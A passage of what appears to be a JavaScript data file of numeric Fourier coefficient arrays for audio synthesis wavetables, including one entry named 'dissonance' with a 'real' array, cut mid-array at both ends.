.001435, -.001056, .001955, .002094, -.00175, .000892, -.000171, .001398, .002456, .003367, -.003502, .003155, .002928, -.002971, .001835, -.000748, -.00063, .003104, -.003022, .002255, -.000799, -.00231, .00222, -.002864, .001688, -.002168, -.000668, .001613, -.001096, .002791, -.002819, .002233, -.000921, .00066, .000596, -.002351, .002573, -.002426, .002304, -.001014, .000473, .001579, -.002072, .002419, -.002071, .001044, -.000144, -.000728, .002113, -.00223, .002269, -.00223, .001087, .000831, -.002021, .001959, -.002036, .001317, -.000024, .000914, .000784, -.001691, .001415, -.00133, .001328, -.000073, -.000587, .000906, -.00125, .001284, -.0012, .000819, .00011, -.000668, .000722, -.001349, .001306, .000069, .001286, -.000006, -.000712, .001172, -.001275, .000947, -.000657, .001289, -.000277, .000272, .001117, -.001266, .001276, -.000708, -.000189, -.000164, -.000563, .0008, -.000732, .001228, .000497, -.000837, .000616, -.000995, .00046, -.000769, .001035, .000591, .001183, .001002, .001068, .001151, -.000822, .001144, .000343, -.001133, .000311, .000718, .000361, .000445, -.000294, .000181, .000278, .000278, -.000499, .000791, .000053, .000644, .000206, -.000686, .000582, -.000056, -.000807, -.000522, -.000101, -.000112, -.000368, -.000054, -.000145, .000581, .000392, -.000041, .00027, -.000042, .00035, -.00062, -.000022, .000363, .000114, .000356, -.000094, .00037, .000061, .000005, .000265, -.000353, -.000116, .000066, .000004, .000226, .000406, .000089, .000016, .000257, .000256, .000045, .000015, .00026, .000154, .000316, .00022, .000418, .000231, -.000003, .000127, .000334, .000072, .000041, .000238, .000149, .000139, .000439, .000094, .000198, .000212, .000066, .000186, .000163, .000073, .000036, .00012, .000292, .00017, .00001, .000115, .000099, -.000037, -.000093, .000204, .000064, .000009, .000106, .000144, .000163, .000158, .000234, .000268, .000363, .000404, .000455, .000537, .000569, .000632, .000661, .000694, .00071, .000714, .000704, .000687, .000655, .000613, .000562, .000517, .000462, .000395, .000338, .000302, .000266, .000203, .000168, .000169, .000171, .000146, .000132, .000159, .000177, .000154, .00014, .000173, .000192, .000163, .000146, .000182, .000201, .000168, .00015, .000188, .000207, .000171, .00015, .000192, .000213, .000173, .00015, .000195, .000216, .000174, .000149, .000197, .000219, .000174, .000148, .000198, .000221, .000173, .000146, .000198, .000222, .000172, .000144, .000198, .000222, .000171, .000142, .000198, .000222, .00017, .000139, .000197, .000221, .000168, .000137, .000196, .000221, .000166, .000135, .000194, .000221, .000164, .000132, .000193, .000219, .000162, .000129, .000191, .000218, .00016, .000126, .000189, .000217, .000158, .000123, .000188, .000215, .000156, .00012, .000186, .000214, .000154, .000117, .000184, .000212, .000152, .000114, .000182, .00021, .00015, .000112, .00018, .000208, .000147, .00011, .000178, .000207, .000146, .000106, .000175, .000206, .000143, .000104, .000174, .000204, .000141, .000102, .000171, .000202, .000138, .000099, .000169, .0002, .000136, .000098, .000167, .000199, .000135, .000095, .000166, .000197, .000133, .000093, .000163, .000195, .000131, .00009, .000161, .000193, .000129, .000087, .000159, .000192, .000127, .000085, .000158, .00019, .000125, .000083, .000155, .000189, .000123, .000082, .000153, .000186, .000121, .000081, .000151, .000185, .000119, .000078, .000149, .000183, .000117, .000076, .000148, .000182, .000116, .000072, .000146, .000179, .000115, .000072, .000143, .000177, .000113, .00007, .000142, .000176, .000111, .000067, .000139, .000175, .000111, .000063, .000135, .000173, .000109, .000066, .000137, .000173, .000107, .000063, .000136, .000171, .000106, .00006, .000133, .000169, .000104, .00006, .000132, .000168, .000104, .000057, .000131, .000166, .000101, .000057, .000128, .000164, .000099, .000055, .000126, .000164, .000098, .000053, .000125, .000162, .000098, .000052, .000123, .000161, .000096, .000049, .000122, .000159, .000094, .000048, .00012, .000156, .000093, .000047, .000119, .000156, .000091, .000046, .000119, .000156, .000091, .000046, .000117, .000152, .000091, .000043, .000114, .00015, .000088, .00004, .000115, .00015, .000087, .000039, .000114, .000152, .000085, .000038, .00011, .00015, .000088, .000038, .000108, .000145, .000085, .000037, .000106, .000138, .000082, .000031, .000106, .000148, .000056, .000082, .0001, .000158, .000144, .000101, .0001, .000147, .000089, .000037, .000112, .000152, .000086, .000033, .000109, .000153, .000087, .00003, .000101, .000151, .000081, .000035, .000107, .000147, .000078, .000031, .000106, .000146, .000078, .00003, .000103, .000144, .000081, .000029, .000104, .000146, .000078, .000027, .000102, .000142, .000076, .000027, .000101, .000142, .000078, .00003, .000101, .00014, .000076, .000026, .000099, .000143, .000076, .000025, .000098, .000138, .000076, .000024, .000098, .000139, .000074, .000026, .000096, .00014, .000072, .000024, .000093, .000139, .000071, .000019, .000093, .000138, .000073, .000021, .000092, .000133, .000071, .000024, .000092, .000133, .00007, .000018, .000091, .000134, .000069, .000023, .00009, .000133, .00007, .000016, .000087, .000131, .000078, .00002, .000088, .000133, .000066, .000016, .000089, .00013, .000065, .000015, .000088, .000132, .000063, .000014, .000085, .00013, .000064, .000017, .000084, .000127, .000066, .000013, .000083, .000125, .000063, .000009, .000082, .000125, .000061, .000011, .00008, .000125, .000061, .000011, .000083, .000126, .00006, .000014, .000079, .000124, .000061, .000011, .00008, .000121, .00006, .000011, .000079, .000119, .000062, .000014, .000077, .000126, .000058, .000005, .000076, .00012, .000058, .000008, .000078, .000119, .000056, .000009, .000075, .000117, .000059, .000008, .000075, .000119, .000057, .000009, .000074, .000113, .000057, .000003, .000076, .000113, .000056, .000006, .000075, .00012, .000056, .000007, .000074, .000117, .000058, .000007, .000073, .000118, .000058, .000015, .00007, .000119, .000054, .000003, .000072, .000114, .000053, .000001, .000069, .000114, .000052, .000004, .000073, .000114, .000052, .000005, .00007, .000117, .000052, .000002, .000067, .000115, .000054, .000004, .000067, .000114, .000051, .000003, .00007, .000114, .000048, -.000003, .000067, .000112, .000052, -.000003, .000065, .00011, .000049, -.000002, .000063, .000108, .000049, -.000001, .000066, .000107, .000047, -.000002, .000066, .000108, .000051, -.000001, .000066, .00011, .000046, -.000005, .00006, .000104, .000044, -.000003, .000063, .000108, .000047, -.000005, .000062, .00011, .000044, 0, .000061, .000109, .000047, -.000003, .000063, .000103, .000047, -.000005, .000058, .000105, .000045, -.000005, .000058, .000102, .000045, -.000004, .000061, .000105, .000044, -.000003, .000058, .000104, .000047, -.000001, .00006, .000102, .000043, -.000009, .000058, .000105, .000045, -.000005, .000056, .000099, .000044, -.000005, .000056, .0001, .000044, -.000008, .000053, .000101, .00004, -.000007, .000054, .0001, .000044, -.000006, .000054, .000101, .000041, -.000012, .000056, .000099, .000039, -.000007, .000056, .000096, .000041, -.000012, .000055, .000098, .000041, -.000009, .000053, .0001, .000037, -.000009, .000051, .000096, .000039, -.000006, .000051, .000099, .000039, -.000009, .000045, .000096, .000039, -.000005, .00005, .000094, .000041, -.000012, .000052, .000103, .000038, -.000015, .00005, .000097, .000037, -.000016, .000053, .000094, .000038, -.00001, .000051, .000095, .000037, -.000009, .000047, .000092, .000038, -.000013, .000049, .000092, .000033, -.000016, .000049, .000093, .000039, -.000011, .00005, .000093, .000037, -.000011, .000049, .00009, .000033, -.000015, .000047, .000089, .000035, -.000014, .000046, .000092, .000037, -.000014, .000044, .000094, .000032, -.000013, .000041, .00009, .000037, -.000019, .000046, .000089, .000034, -.000014, .00005, .000088, .000036, -.000015, .000048, .000085, .000031, 0, .000043, .000079, .000036, -.000016, .000042, .000087, .000033, -.000013, .000044, .000088, .000032, -.000015, .000039, .000087, .000032, -.000022, .000039, .000079, .000031, -.000009, .000037, .000089, .000032, -.000017, .000048, .00009, .000033, -.000012, .000041, .000091, .000034, .000003, .000043, .000082, .000037, -.000008, .000044, .00009, .000031, -.000016, .000046, .000083, .000032, -.000016, .000043, .000087, .000029, -.000023, .000039, .000086, .000027, -.000014, .00004, .00008, .00003, -.00002, .000042, .000091, .000031, -.000014, .000037, .000082, .000032, -.000026, .000043, .000081, .000028, -.000016, .000033, .00008, .000031, -.000019, .000032, .000081, .000031, -.000012, .00004, .000083, .00003, -.00002, .000045, .000073, .000027, -.000024, .000037, .000075, .000031, -.000024, .000041, .00008, .000026, -.000017, .000037, .000087, .000029, -.000028, .000041, .000083, .00004, -.000022, .000052, .000077, .000028, -.000005, .000085, .000077, .000017, .000019, .000092, .000038, .000034, -.000031, .000035, .000073, .000018, -.000018, .000035, .000093, .00002, -.000025, .000028, .000086, .000025, -.000022, .000025, .00007, .000031, -.000038, .000032, .000068, .00003, -.000018, .000029, .000079, .000025, -.000025, .00003, .000073, .000021, -.000018, .000037, .000068, .000025, -.000023, .000037, .00007, .000026, -.000022, .000037, .00008, .000024, -.000021, .000033, .000076, .000021, -.000023, .00003, .000081, .000025, -.000013, .000033, .000078, .000023, -.000021, .00004, .000075, .000025, -.000027, .000036, .000077, .000026, -.000027, .000036, .00007, .00002, -.000022, .000029, .000069, .000024, -.000018, .000033, .000071, .000021, -.000028, .00003, .000075, .000022, -.000027, .00003, .000066, .000021, -.000009, .000025, .000073, .000027, .000004, .000024, .00007, .000021, -.000025, .000032, .000078, .000027, -.000023, .000032, .000075, .000022, -.000018, .000034, .00007, .000022, -.000021, .000026, .000075, .000021, -.000016, .000032, .000071, .000019, -.000023, .000026, .000075, .000021, -.000043, .000026, .000062, .000025, -.000025, .000024, .000078, .000027, -.000028, .000032, .000073, .000023, -.000024, .000034, .000079, .000024, -.000021, .00003, .000072, .000023, -.000026, .000033, .000077, .000022, -.00003, .000029, .000074, .000028, -.000027, .000032, .000078, .000021, -.000037, .000027, .000071, .000015, -.000027, .000033, .000072, .000018, -.000031, .000023, .000067, .000024, -.000031, .000025, .000073, .000021, -.000027, .000031, .000078, .000023, -.000024, .000032, .00007, .000022, -.00003, .000036, .000076, .000017, -.000017, .000034, .000063, .000018, -.000028, .000026, .000062, .00002, -.000024, .000027, .000075, .000024, -.000027, .000026, .000067, .000023, -.000024, .000031, .000068, .00002, -.000031, .000031, .000071, .000026, -.000027, .00003, .000063, .000017, -.000027, .000026, .00007, .000024, -.000032, .000022, .000066, .000018, -.000028, .000027, .000071, .000023, -.000026, .000024, .000072, .000018, -.000032, .000025, .000067, .000019, -.000029, .000029, .000067, .000016, -.000033, .00002, .000073, .000015, -.000029, .000028, .000068, .000021, -.000029, .000028, .000057, .000019, -.000022, .000026, .000063, .000016, -.000022, .00002, .000068, .000015, -.000022, .000021, .000066, .000019, -.000023, .000023, .000058, .000019, -.000028, .000027, .00007, .000019, -.000021, .00002, .000062, .000016, -.000039, .000021, .000063, .000017, -.000022, .000027, .000069, .000015, -.000027, .000022, .000064, .000022, -.000032, .000023, .000056, .000037, -.000028, .000017, .000065, .00001, -.00003, .000018, .000062, .000014, -.00003, .000023, .000066, .00002, -.000025, .000021, .000066, .000009, -.000023, .000022, .000064, .000014, -.000026, .000022, .00007, .000017, -.000026, .000021, .000061, .000022, -.00003, .000025, .000078, .00001, -.000029, .000018, .000066, .000015, -.000026, .000019, .000062, .000018, -.00003, .000022, .000053, .000009, -.000033, .000017, .000059, .000014, -.000032, .000019, .000059, .000016, -.000028, .000021, .000068, .000015, -.000035, .000018, .00006, .000019, -.000028, .000017, .000067, .000018, -.000033, .000025, .000055, .000013, -.000031, .000016, .000064, .000013, -.000028, .000015, .000063, .000014, -.000027, .000025, .00007, .000015, -.000032, .000024, .000057, .000013, -.000039, .00002, .00007, .000013, -.000032, .000017, .000056, .000015, -.000021, .000021, .000063, .000016, -.000032, .000027, .000065, .000016, -.000029, .000014, .000072, .000014, -.000028, .00002, .000061, .000012, -.000038, .000021, .000065, .000014, -.000035, .000021, .000065, .00002, -.000029, .000017, .000061, .00001, -.000035, .000022, .000059, .000008, -.000044, .000013, .000064, .000016, -.000038, .000028, .000054, .000003, -.000023, .000023, .000052, .000018, -.000037, .000017, .000067, .000009, -.000035, .000015, .000071, .000016, -.000034, .000023, .000058, .000018, -.000033, .000017, .000059, .000013, -.000038, .000012, .000062, .000019, -.000029, .000012, .000069, .000008, -.000031, .000019, .000058, .000016, -.000039, .000024, .000059, .000017, -.000031, .000017, .000056, .000011, -.000032, .000016, .000063, .00001, -.000036, .000029, .000057, .000012, -.000042, .000018, .000069, .000013, -.000037, .000013, .000056, .000009, -.000036, .000011, .000045, .000014, -.00003, .000014, .000048, .000013, -.00003, .000012, .000058, .000004, -.000039, .000023, .000054, .000014, -.00003, .000018, .000059, .00001, -.000027, .000019, .00006, .000005, -.000035, .00001, .000055, .000006, -.000042, -.000006, .000081, -.000001, -.000019, .0001, .000108, -.000019, -.000034, .000015, .000054, .000013, -.000035, .000011, .000052, .000006, -.000039, .000022, .000064, .000014, -.00004, .000013, .000053, .000008, -.000024, .000016, .000059, .00001, -.000032, .000014, .00006, .000011, -.000042, .000019, .000059, .000029, -.000065, .000012, .000012, .000021, -.000043, .000014, .000064, .000007, -.000032, .000019, .000048, .000003, -.000034, .000007, .000058, .000021, -.000039, .000009, .000054, .000008, -.000037, .000011, .000053, .00001, -.000041, .000008, .000048, .000013, -.000045, .000006, .000064, .000003, -.000038, .000018, .000062, .000014, -.000029, .000014, .000065, .000014, -.000037, .000015, .000045, .00001, -.00004, .000005, .000059, 0, -.000051, .000013, .000058, .000014, -.000036, .000033, .000027, -.000025, -.000027, .000041, .000045, .00001, -.000041, .000014, .000055, .00001, -.000037, .000009, .000053, .000006, -.000034, .000004, .000062, .000008, -.000043, .000026, .000065, .000009, -.000041, .000011, .000055, .000011, -.000035, .000014, .000058, .000008, -.000047, .00001, .000056, .000005, -.000041, .000013, .000061, .000004, -.00004, .000013, .000056, .000017, -.000055, .000018, .000073, .000014, -.000035, .000011, .000059, .000003, -.000038, .000018, .000047, .000017, -.000042, .000015, .000056, -.000002, -.000037, .000005, .000063, .00001, -.000052, .000019, .000047, .000001, -.000029, -.000002, .000056, .000009, -.000036, .000009, .000059, .000012, -.000043, .000006, .000039, .000004, -.000032, .000007, .000058, .000001, -.000052, .000009, .000054, .000007, -.000031, .000007, .000072, .000006, -.000036, .000022, .000064, .000006, -.000043, .000011, .00006, .000011, -.000043, .00001, .000048, .000008, -.000043, .000007, .000054, .000005, -.000033, .000015, .000068, .000017, -.000034, .000013, .000057, .000008, -.000044, .000014, .000051, .000018, -.000044, .000009, .00005, .000014, -.000036, .000011, .000055, .000001, -.000044, .000003, .000056, .000003, -.000033, 0, .000057, .000002, -.000042, .000012, .000049, .000006, -.000022, .000016, .000058, .000008, -.000036, .000012, .000057, .000009, -.000036, .000005, .000056, .000006, -.000027, .000004, .000055, .000007, -.000047, .000009, .000052, .000006, -.000035, .000005, .000049, .000001, -.000051, .000008, .000049, -.000002, -.000049, 0, .000058, .000002, -.000043, .000004, .000055, .000003, -.000049, .000003, .000044, -.000004, -.000038, -.000014, .00006, .000008, -.000041, -.000002, .000049, .000004, -.00004, .000007, .000058, .000007, -.00004, .000012, .000052, .000001, -.000032, .000002, .000059, .000006, -.000044, .000008, .000052, .000001, -.000067, .000012, .000048, 0, -.000057, .000009, .000064, .000005, -.000051, .000017, .000064, .000003, -.000051, -.000003, .00006, .000008, -.000036, .000006, .000057, .000001, -.000048, .000007, .00005, .00001, -.000062, .000011, .000061, .000011, -.000048, .000006, .000054, -.000001, -.00004, -.000002, .000072, -.000001, -.000056, .000009, .000055, -.000005, -.000046, .000004, .000066, -.000003, -.000054, .000003, .000059, .000006, -.00004, .000009, .000042, 0, -.000053, .000012, .000066, .000008, -.000042, .000003, .000058, .000004, -.000047, .000004, .000058, -.000001, -.000055, .000009, .000069, -.000003, -.00005, -.000005, .000052, .000004, -.000059, .000001, .000065, .000005, -.000047, .000002, .000052, .000003, -.000055, .000006, .000052, -.000003, -.000041, .000001, .000057, .000004, -.00005, .000001, .000058, -.000003, -.000058, .000004, .000059, .000008, -.000047, .000008, .000072, .000006, -.000043, -.000002, .000058, 0, -.000057, .000005, .000059, .000002, -.000044, .000003, .000056, .000001, -.00004, .000008, .000063, .000003, -.000044, -.000001, .000052, .000004, -.000045, 0, .000068, -.000003, -.000084, .000001, .000057, -.000002, -.000004, .000001, .000053, -.000006, -.000035, -.000007, .000052, .000005, -.000057, .000017, .000044, -.000004, -.000053, .000003, .000045, .000007, -.000058, .000003, .000056, .000009, -.000054, .000011, .000058, .000002, -.000055, -.000006, .000065, .000009, -.000048, -.000001, .000058, .000009, -.000066, -.000003, .000039, -.000006, -.000041, .000011, .000047, -.000002, -.000049, .000004, .000076, -.000007, -.000057, .000001, .000067, .000009, -.000041, -.000003, .000055, .000005, -.000055, -.000001, .000066, .000001, -.00007, 0, .000059, .000005, -.000057, .000004, .000068, .000006, -.000036, .000004, .000055, -.000015, -.000056, .000009, .000051, -.000009, -.000061, -.000018, .000059, .000013, -.000058, -.000004, .000058, -.000003, -.000059, .000022, .000075, .000041, -.000082, .000002, .000097, .000031, -.000098, -.000003, .000076, 0, -.00005, 0, .000062, .000007, -.000047, .000006, .000031, -.000004, -.000051, .000004, .000054, .000006, -.000038, .000008, .000052, .000002, -.000056, .000001, .000055, 0, -.000052, .000005, .000055, .00001, -.000051, 0, .000047, .000012, -.000049, 0, .000054, -.000009, -.000045, .000012, .000054, 0, -.00003 ] } ],
	[ "dissonance",  { real: [ 0, -.000001, -.001193, .000975, -.225597, .000556, -.000341, .146408, -.000401, .000356, -.082233, .000203, -.000177, .054735, -.000862, .000714, -.054117, .000464, -.000438, .042607, -.000199, .000105, -.04084, .000061, -.00006, .027337, -.000058, .000057, -.033029, .00005, -.000049, .037746, -.000047, .000047, -.040758, .000062, -.001234, .008164, -.008056, .007953, -.007853, .007757, -.007665, .007575, -.007489, .007405, -.007103, .007028, -.006954, .006675, -.006608, .006543, -.00648, .006419, -.00636, .006302, -.005696, .005646, -.005597, .00555, -.005503, .005458, -.005414, .005371, -.005012, .004973, -.004936, .004899, -.004863, .004827, -.004793, .004759, -.004726, .003904, -.003878, .003852, -.003826, .003802, -.003777, .003753, -.00373, .003707, -.003684, .003662, -.003423, .003403, -.003384, .003364, -.003345, .003326, -.003308, .00329, -.003272, .003254, -.003237, .00322, -.003203, .003186, -.003074, .003059, -.003043, .003028, -.003014, .002999, -.002985, .00297, -.002956, .002942, -.002929, .002915, -.002902, .002889, -.002876, .002863, -.002851, .002839, -.002826, .002814, -.002802, .00279, -.002779, .002767, -.002756, .002745, -.002734, .002723, -.002712, .002701, -.002691, .00268, -.00267, .00266, -.00265, .00264, -.00263, .00262, -.00261, .002601, -.002591, .002582, -.002653, .002644, -.002634, .002625, -.002616, .002607, -.002598, .002589, -.00258, .002572, -.002563, .002555, -.002546, .002538, -.00253, .002521, -.002513, .002505, -.002497, .002489, -.002482, .002474, -.002466, .002459, -.002451, .002444, -.002436, .002429, -.002497, .00249, -.002482, .002475, -.002468, .002461, -.002453, .002446, -.002439, .002432, -.002426, .002419, -.002412, .002405, -.002399, .002392, -.002385, .002379, -.002373, .002366, -.00236, .002353, -.002347, .002341, -.002335, .002329, -.002323, .002317, -.002311, .002305, -.002299, .002293, -.002287, .002281, -.002276, .00227, -.002408, .002402, -.002396, .00239, -.002384, .002378, -.002373, .002367, -.002361, .002356, -.00235, .002345, -.002339, .002334, -.002328, .002323, -.002317, .002312, -.002307, .002301, -.002296, .002291, -.002286, .002281, -.002276, .00227, -.002265, .00226, -.002255, .00225, -.002246, .002241, -.002236, .002231, -.002226, .002221, -.002217, .002212, -.002207, .002202, -.002198, .002193, -.002189, .002184, -.00218, .002175, -.00217, .002166, -.002162, .002157, -.002153, .002148, -.002144, .00214, -.002135, .002198, -.002193, .002189, -.002185, .00218, -.002176, .002172, -.002167, .002163, -.002159, .002155, -.002151, .002146, -.002142, .002138, -.002134, .00213, -.002126, .002122, -.002118, .002114, -.00211, .002106, -.002102, .002098, -.002094, .00209, -.002086, .002083, -.002079, .002075, -.002071, .002067, -.002064, .00206, -.002056, .002052, -.002049, .002045, -.002041, .002038, -.002034, .002031, -.002027, .002023, -.00202, .002016, -.002013, .002009, -.002006, .002002, -.001999, .001995, -.001992, .001988, -.001985, .001981, -.001978, .001975, -.001971, .001968, -.001964, .001961, -.001958, .001954, -.001951, .001948, -.001945, .001941, -.001938, .001935, -.001932, .001928, -.001925, .001922, -.001919, .001916, -.001912, .001909, -.001906, .001903, -.0019, .001897, -.001894, .001891, -.001887, .001884, -.001881, .001878, -.001875, .001872, -.001869, .001866, -.001863, .00186, -.001857, .001854, -.001851, .001848, -.001845, .001842, -.001839, .001836, -.001833, .001831, -.001828, .001825, -.001822, .001819, -.001816, .001813, -.00181, .001807, -.001805, .001802, -.001799, .001796, -.001793, .001791, -.001788, .001785, -.001782, .001779, -.001777, .001774, -.001771, .001768, -.001766, .001763, -.00176, .001757, -.001755, .001752, -.001749, .001747, -.001744, .001741, -.001738, .001736, -.001733, .00173, -.001728, .001725, -.001722, .00172, -.001717, .001715, -.001712, .001709, -.001707, .001704, -.001701, .001699, -.001696, .001694, -.001691, .001689, -.001686, .001683, -.001681, .001678, -.001676, .001673, -.001671, .001668, -.001665, .001663, -.00166, .001658, -.001655, .001143, -.001142, .00114, -.001138, .001137, -.001135, .001133, -.001131, .00113, -.001128, .001126, -.001124, .001123, -.001121, .001119, -.001118, .001116, -.001114, .001112, -.001111, .001109, -.001107, .001106, -.001104, .001102, -.001101, .001099, -.001097, .001096, -.001094, .001092, -.001091, .001158, -.001156, .001154, -.001153, .001151, -.001149, .001147, -.001145, .001144, -.001142, .00114, -.001138, .001137, -.001135, .001133, -.001131, .00113, -.001128, .001126, -.001124, .001123, -.001121, .001119, -.001117, .001116, -.001114, .001112, -.00111, .001109, -.001107, .001105, -.001103, .001102, -.0011, .001098, -.001097, .001095, -.001093, .001091, -.00109, .001088, -.001086, .001084, -.001083, .001081, -.001079, .001078, -.001076, .001074, -.001072, .001071, -.001069, .001067, -.001065, .001064, -.001062, .00106, -.001059, .001057, -.001055, .001053, -.001052, .00105, -.001048, .001047, -.001045, .001043, -.001041, .00104, -.001038, .001036, -.001035, .001033, -.001031, .001029, -.001028, .001026, -.001024, .001023, -.001021, .001019, -.001017, .001016, -.001014, .001012, -.001011, .001009, -.001007, .001005, -.001004, .001002, -.001, .000999, -.000997, .000995, -.000993, .000992, -.00099, .000988, -.000987, .000985, -.000983, .000981, -.00098, .000978, -.000976, .000975, -.000973, .000971, -.000969, .000968, -.000966, .000964, -.000962, .000961, -.000959, .000957, -.000956, .000954, -.000952, .00095, -.000949, .000947, -.000945, .000943, -.000942, .00094, -.000938, .000937, -.000935, .000933, -.000931, .00093, -.000928, .000926, -.000924, .000923, -.000921, .000919, -.000917, .000916, -.000914, .000912, -.00091, .000909, -.000907, .000905, -.000903, .000902, -.0009, .000898, -.000896, .000895, -.000814, .000813, -.000811, .000809, -.000808, .000806, -.000805, .000803, -.000801, .0008, -.000798, .000796, -.000795, .000793, -.000792, .00079, -.000788, .000787, -.000785, .000783, -.000782, .00078, -.000778, .000777, -.000775, .000774, -.000772, .00077, -.000769, .000767, -.000765, .000764, -.000762, .00076, -.000759, .000757, -.000755, .000754, -.000752, .00075, -.000749, .000747, -.000745, .000744, -.000742, .00074, -.000739, .000737, -.000735, .000734, -.000732, .00073, -.000729, .000727, -.000725, .000724, -.000722, .00072, -.000719, .000717, -.000715, .000713, -.000712, .00071, -.000708, .000707, -.000705, .000703, -.000702, .0007, -.000698, .000696, -.000695, .000693, -.000691, .000689, -.000688, .000686, -.000684, .000683, -.000681, .000679, -.000677, .000676, -.000674, .000672, -.00067, .000669, -.000667, .000665, -.000663, .000662, -.00066, .000658, -.000656, .000655, -.000653, .000651, -.000649, .000648, -.000646, .000644, -.000642, .00064, -.000639, .000637, -.000635, .000633, -.000632, .00063, -.000628, .000626, -.000624, .000623, -.000621, .000619, -.000617, .000615, -.000614, .000612, -.00061, .000608, -.000606, .000604, -.000603, .000601, -.000599, .000597, -.000595, .000593, -.000592, .00059, -.000588, .000586, -.000584, .000582, -.000581, .000579, -.000577, .000575, -.000573, .000571, -.000569, .000568, -.000566, .000564, -.000562, .00056, -.000558, .000556, -.000554, .000553, -.000551, .000471, -.000469, .000467, -.000466, .000464, -.000463, .000461, -.000459, .000458, -.000456, .000454, -.000453, .000451, -.00045, .000448, -.000446, .000445, -.000443, .000441, -.00044, .000438, -.000436, .000435, -.000433, .000431, -.00043, .000428, -.000426, .000425, -.000423, .000421, -.00042, .000418, -.000416, .000415, -.000413, .000411, -.00041, .000408, -.000406, .000404, -.000403, .000401, -.000399, .000398, -.000396, .000394, -.000393, .000391, -.000389, .000387, -.000386, .000384, -.000382, .000381, -.000379, .000377, -.000375, .000374, -.000372, .00037, -.000369, .000367, -.000365, .000363, -.000362, .00036, -.000358, .000356, -.000355, .000353, -.000351, .000349, -.000348, .000346, -.000344, .000342, -.000341, .000339, -.000337, .000335, -.000333, .000332, -.00033, .000328, -.000326, .000325, -.000323, .000321, -.000319, .000317, -.000316, .000314, -.000312, .00031, -.000308, .000307, -.000305, .000303, -.000301, .000299, -.000298, .000296, -.000294, .000292, -.00029, .000289, -.000287, .000285, -.000283, .000281, -.00028, .000278, -.000276, .000274, -.000272, .00027, -.000269, .000267, -.000265, .000263, -.000261, .000259, -.000258, .000256, -.000254, .000252, -.00025, .000248, -.000246, .000245, -.000243, .000241, -.000239, .000237, -.000235, .000233, -.000232, .00023, -.000228, .000226, -.000224, .000222, -.00022, .000219, -.000217, .000215, -.000213, .000211, -.000209, .000207, -.000205, .000203, -.000202, .0002, -.000198, .000196, -.000194, .000192, -.00019, .000188, -.000186, .000185, -.000183, .000181, -.000179, .000177, -.000175, .000173, -.000171, .000169, -.000167, .000165, -.000164, .000162, -.00016, .000158, -.000156, .000154, -.000152, .00015, -.000148, .000146, -.000144, .000142, -.000141, .000139, -.000137, .000135, -.000133, .000131, -.000129, .000112, -.000111, .000109, -.000107, .000106, -.000104, .000102, -.0001, .000099, -.000097, .000095, -.000093, .000092, -.00009, .000088, -.000087, .000085, -.000083, .000081, -.00008, .000078, -.000076, .000075, -.000073, .000071, -.000069, .000068, -.000066, .000064, -.000062, .000061, -.000059, .000057, -.000056, .000054, -.000052, .00005, -.000049, .000047, -.000045, .000043, -.000042, .00004, -.000038, .000036, -.000035, .000033, -.000031, .00003, -.000028, .000026, -.000024, .000023, -.000021, .000019, -.000017, .000016, -.000014, .000012, -.00001, .000009, -.000007, .000005, -.000003, .000002, 0, -.000002, .000003, -.000005, .000007, -.000009, .00001, -.000012, .000014, -.000016, .000017, -.000019, .000021, -.000023, .000024, -.000026, .000028, -.00003, .000031, -.000033, .000035, -.000036, .000038, -.00004, .000042, -.000043, .000045, -.000047, .000049, -.00005, .000052, -.000054, .000056, -.000057, .000059, -.000061, .000062, -.000064, .000066, -.000068, .000069, -.000071, .000073, -.000075, .000076, -.000078, .00008, -.000081, .000083, -.000085, .000087, -.000088, .00009, -.000092, .000093, -.000095, .000097, -.000099, .0001, -.000102, .000104, -.000105, .000107, -.000109, .000111, -.000112, .000114, -.000116, .000117, -.000119, .000121, -.000122, .000124, -.000126, .000128, -.000129, .000131, -.000133, .000134, -.000136, .000138, -.000139, .000141, -.000143, .000144, -.000146, .000148, -.000149, .000151, -.000153, .000154, -.000156, .000158, -.000159, .000161, -.000163, .000164, -.000166, .000168, -.000169, .000171, -.000173, .000174, -.000176, .000178, -.000179, .000181, -.000183, .000184, -.000186, .000188, -.000189, .000191, -.000192, .000194, -.000196, .000197, -.000199, .000201, -.000202, .000204, -.000205, .000207, -.000209, .00021, -.000212, .000213, -.000215, .000217, -.000218, .00022, -.000221, .000223, -.000224, .000226, -.000228, .000229, -.000231, .000232, -.000201, .000202, -.000203, .000205, -.000206, .000207, -.000209, .00021, -.000211, .000213, -.000214, .000215, -.000217, .000218, -.000219, .00022, -.000222, .000223, -.000224, .000226, -.000227, .000228, -.00023, .000231, -.000232, .000233, -.000235, .000236, -.000237, .000238, -.00024, .000241, -.000242, .000244, -.000245, .000246, -.000247, .000249, -.00025, .000251, -.000252, .000253, -.000255, .000256, -.000257, .000258, -.00026, .000261, -.000262, .000263, -.000264, .000266, -.000267, .000268, -.000269, .00027, -.000272, .000273, -.000274, .000275, -.000276, .000277, -.000279, .00028, -.000281, .000282, -.000283, .000284, -.000285, .000287, -.000288, .000289, -.00029, .000291, -.000292, .000293, -.000294, .000295, -.000297, .000298, -.000299, .0003, -.000301, .000302, -.000303, .000304, -.000305, .000306, -.000307, .000308, -.000309, .000311, -.000312, .000313, -.000314, .000315, -.000316, .000317, -.000318, .000319, -.00032, .000321, -.000322, .000323, -.000324, .000325, -.000326, .000327, -.000328, .000329, -.00033, .000331, -.000331, .000332, -.000333, .000334, -.000335, .000336, -.000337, .000338, -.000339, .00034, -.000341, .000342, -.000343, .000343, -.000344, .000345, -.000346, .000347, -.000348, .000349, -.00035, .00035, -.000351, .000352, -.000353, .000354, -.000355, .000355, -.000356, .000357, -.000358, .000359, -.000359, .00036, -.000361, .000362, -.000363, .000363, -.000364, .000365, -.000366, .000366, -.000367, .000368, -.000368, .000369, -.00037, .000371, -.000371, .000372, -.000373, .000373, -.000374, .000375, -.000375, .000376, -.000377, .000377, -.000378, .000379, -.000379, .00038, -.000381, .000381, -.000382, .000382, -.000383, .000384, -.000384, .000385, -.000385, .000386, -.000387, .000387, -.000388, .000388, -.000389, .000389, -.00039, .00039, -.000391, .000391, -.000392, .000392, -.000393, .000393, -.000394, .000394, -.000395, .000395, -.000396, .000396, -.000396, .000397, -.000397, .000398, -.000398, .000399, -.000399, .000399, -.0004, .0004, -.0004, .000401, -.000401, .000402, -.000402, .000402, -.000403, .000403, -.000403, .000404, -.000404, .000404, -.000404, .000405, -.000405, .000405, -.000406, .000406, -.000406, .000406, -.000406, .000407, -.000407, .000407, -.000407, .000408, -.000408, .000408, -.000408, .000408, -.000291, .000292, -.000292, .000292, -.000292, .000292, -.000292, .000292, -.000292, .000292, -.000292, .000292, -.000292, .000292, -.000293, .000293, 